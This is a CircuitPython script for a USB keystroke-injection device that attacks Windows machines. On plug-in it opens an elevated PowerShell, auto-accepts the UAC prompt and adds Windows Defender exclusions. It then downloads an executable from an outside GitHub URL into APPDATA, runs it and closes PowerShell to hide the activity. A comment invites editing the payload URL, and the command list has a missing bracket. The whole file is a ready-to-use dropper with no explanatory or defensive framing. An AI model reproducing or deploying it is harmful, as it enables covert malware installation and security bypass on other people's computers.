import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

time.sleep(2)

kbd.press(Keycode.WINDOWS, Keycode.R)
kbd.release_all()
time.sleep(0.7)
layout.write("powershell")
time.sleep(0.6)
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(2.5)

layout.write("Start-Process powershell -Verb runAs")
kbd.press(Keycode.ENTER)
kbd.release_all()

time.sleep(1.5)
kbd.press(Keycode.LEFT_ALT, Keycode.Y)
kbd.release_all()
time.sleep(0.3)
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(3.8) 

commands = [
    'Add-MpPreference -ExclusionPath "$env:APPDATA" -Force',
    'IWR https://github.com/roxcansanto/selam/raw/refs/heads/main/Windows.exe -OutFile \"$env:APPDATA\\windowss.exe"', #edit here
    'Add-MpPreference -ExclusionProcess "$env:APPDATA\\windowss.exe" -Force',
    'Start-Process "$env:APPDATA\\windowss.exe"',
    'Start-Sleep -Seconds 4',  
    'Get-Process powershell | Stop-Process -Force' 

for cmd in commands:
    layout.write(cmd)
    kbd.press(Keycode.ENTER)
    kbd.release_all()
    time.sleep(1.6)  

print("Tüm komutlar tek tek çalıştı → denemee.exe başladı → PowerShell kapandı!")
